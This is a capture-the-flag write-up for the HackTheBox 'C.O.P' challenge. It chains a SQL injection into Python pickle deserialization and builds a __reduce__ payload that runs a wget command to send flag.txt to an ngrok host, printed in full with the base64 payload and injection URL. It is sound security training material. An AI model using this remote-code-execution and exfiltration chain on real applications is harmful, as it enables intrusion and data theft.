# HackTheBox C.O.P challenge
the first thing we see in the challenge's source code is an obvious SQL injection vulnerability <br>
```python
from application.database import query_db

class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')
```
but that is not enough to solve this challenge and there's nothing useful in the database because in order to capture the flag we need to be able to read files on the system <br>
as the name of the challenge also suggests this is a python pickle deserialization vulnerability [for more information read this article](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) <br>

as you can see in the source code website uses pickle module to turn "Item" objects into a base64 encoded format and store them in the database.
```python
class Item:
	def __init__(self, name, description, price, image):
		self.name = name
		self.description = description
		self.image = image
		self.price = price

def migrate_db():
    items = [
        Item('Pickle Shirt', 'Get our new pickle shirt!', '23', '/static/images/pickle_shirt.jpg'),
        Item('Pickle Shirt 2', 'Get our (second) new pickle shirt!', '27', '/static/images/pickle_shirt2.jpg'),
        Item('Dill Pickle Jar', 'Literally just a pickle', '1337', '/static/images/pickle.jpg'),
        Item('Branston Pickle', 'Does this even fit on our store?!?!', '7.30', '/static/images/branston_pickle.jpg')
    ]
    
    with open('schema.sql', mode='r') as f:
        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
        get_db().cursor().executescript(f.read().format(*list(shop)))
```
then in the templates it passes the data through a "pickle" functions that turns the data into original form<br>
app.py:
```
@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
```
index.html:
```html
...
<div class="row gx-4 gx-lg-5 row-cols-2 row-cols-md-3 row-cols-xl-4">
                    {% for product in products %}
                    {% set item = product.data | pickle %}
                    <div class="col mb-5">
                        <div class="card h-100">
...
```
We can exploit this using the SQL injection vulnerability we found before<br>
```
http://159.65.20.166:32188/view/' union select "<malicious base64-encoded pickled object>" --
```
since we can't get the code outputs directly the best way would be to run an ngrok tunnel<br>
```
ngrok http 8000
```
output:
```
ngrok                                                           (Ctrl+C to quit)
                                                                                
Build better APIs with ngrok. Early access: ngrok.com/early-access              
                                                                                
Session Status                online                                            
Account                       amirali.rafie.03@gmail.com (Plan: Free)           
Version                       3.5.0                                             
Region                        United States (us)                                
Latency                       33ms                                              
Web Interface                 http://127.0.0.1:4040                             
Forwarding                    https://e127-50-....-31.ngrok-free.app -> http:
                                                                                
Connections                   ttl     opn     rt1     rt5     p50     p90       
                              1       0       0.00    0.00    0.00    0.00      
                                                                                
HTTP Requests                                                                   
-------------           

```
now we can create our payload<br>
```python
import sys
import base64
import pickle

class Payload:

  def __reduce__(self):
    import os
    command = "wget https://e127-50-....-31.ngrok-free.app/`cat flag.txt`"
    print(command)
    return os.system, (command,)


payload = base64.b64encode(pickle.dumps(Payload())).decode()
print(payload)
```
output:
```
gASVWAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjD13Z2V0IGh0dHBzOi8vZTEyNy01MC0xMDEtMTYxLTMxLm5ncm9rLWZyZWUuYXBwL2BjYXQgZmxhZy50eHRglIWUUpQu
```
then we can execute our payload<br>
```
http://159.65.20.166:32188/view/' union select "gASVWAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjD13Z2V0IGh0dHBzOi8vZTEyNy01MC0xMDEtMTYxLTMxLm5ncm9rLWZyZWUuYXBwL2BjYXQgZmxhZy50eHRglIWUUpQu" --
```
and we just captured the flag<br>
```
ngrok                                                           (Ctrl+C to quit)
                                                                                
Build better APIs with ngrok. Early access: ngrok.com/early-access              
                                                                                
Session Status                online                                            
Account                       amirali.rafie.03@gmail.com (Plan: Free)           
Version                       3.5.0                                             
Region                        United States (us)                                
Latency                       53ms                                              
Web Interface                 http://127.0.0.1:4040                             
Forwarding                    https://e127-50-....-31.ngrok-free.app -> http:
                                                                                
Connections                   ttl     opn     rt1     rt5     p50     p90       
                              1       0       0.01    0.00    0.00    0.00      
                                                                                
HTTP Requests                                                                   
-------------                                                                   
                                                                                
GET /HTB{n0_m0.........aanda_4u} 502 Bad Gateway
```
